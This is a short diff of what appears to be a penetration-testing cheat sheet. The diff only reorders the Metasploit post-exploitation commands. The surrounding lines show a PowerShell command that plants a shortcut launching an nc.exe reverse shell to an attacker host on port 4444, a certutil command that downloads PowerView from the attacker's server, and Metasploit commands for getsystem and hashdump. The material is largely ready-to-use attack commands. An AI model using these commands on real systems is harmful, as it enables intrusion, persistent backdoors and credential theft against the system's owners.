@@ -380,16 +380,17 @@ URL=C:\programdata\shell.bat
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Common Applications\Notepad.lnk');$s.TargetPath='C:\Windows\System32\cmd.exe';$s.Arguments='/c \"C:\ProgramData\nc.exe $MYIP 4444 -e cmd\"';$s.Save()"
 
 [*] Metasploit
+arp
+ipconfig
+sysinfo
+getuid
+getprivs
+hashdump
 use priv
 getsystem
-getprivs
-getuid
-hashdump
 background
 sessions
 sessions -i 1
-ipconfig
-sysinfo
 
 [*] Powerview
 powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programdata\powerview.ps1"
